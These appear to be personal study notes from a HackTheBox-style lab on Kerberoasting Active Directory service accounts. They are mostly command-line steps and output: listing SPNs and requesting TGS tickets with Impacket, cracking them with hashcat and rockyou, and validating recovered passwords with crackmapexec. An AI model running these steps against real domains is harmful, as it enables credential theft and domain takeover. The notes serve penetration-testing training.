...
- Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT_AUTHORITY/LOCAL SERVICE
...
---
## Requirements
1. A clear-text password or NTLM hash
2. a shell in context of a domain user account
3. System level access on a domain-joined host
## Efficiency
1. Crack TGS tickets and obtain Domain Admin access straightaway or obtain credentials that help move us down the path to domain compromise
	1. High risk
2. Other times we may retrieve TGS tickets, some can crack and none for priviledged users
	1. Medium risk but note client that if password was changed to something weaker then would be high risk
---
## Performing attack
### Impacket
#impacket
```shell-session
sam9a99@htb[/htb]$ GetUserSPNs.py -h
...
List SPN Accounts
```shell-session
sam9a99@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
...
$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be ---SNIP---

$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec ---SNIP---

<SNIP>
```
Request single TGS ticket
```shell-session
sam9a99@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
...
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b260323215297
```
Save TGS Ticket to an Output File
```shell-session
sam9a99@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
...
```shell-session
sam9a99@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f---SNIP---:database!
```
Test authentication against a domain controller
```shell-session
sam9a99@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
...
```shell-session
sam9a99@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
```
...
```shell-session
sam9a99@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```
...
```shell-session
sam9a99@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```
### Modifiying crack_file for Hashcat
```shell-session
sam9a99@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
### Viewing the prepared Hash
```shell-session
sam9a99@htb[/htb]$ cat sqldev_tgs_hashcat 

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c9 ---SNIP---
```
### Crack the Hash with Hashcat
```shell-session
sam9a99@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
...
[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7
```
...
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8886261660536CC1$4A8E252D305475EB9410FF3E1E99517F90E27FB588173ACE3651DEACCDEC62165DE6EA1E6337F3640632FA42419A535B501ED1D4D1A0B704AA2C56880D74C2940170DC0747CE4D0
```
...
```
- msDS-SupportedEncryptionTypes attibute is set to 0
	- chart https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797 states this means specific encryption type is not defined thus default RC4_HMAC_MD5
```powershell-session
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
...
```shell-session
sam9a99@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
...
[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$8939F8C5B97A4CAA170AD706$84B0DD2C5A931E123918FFD64561BFE651F89F079A47053814244C0ECDF15DF136E5787FAC4341A1BDF6D5077EAF155A75ACF0
```
### Running Hashcat
```shell-session
sam9a99@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```
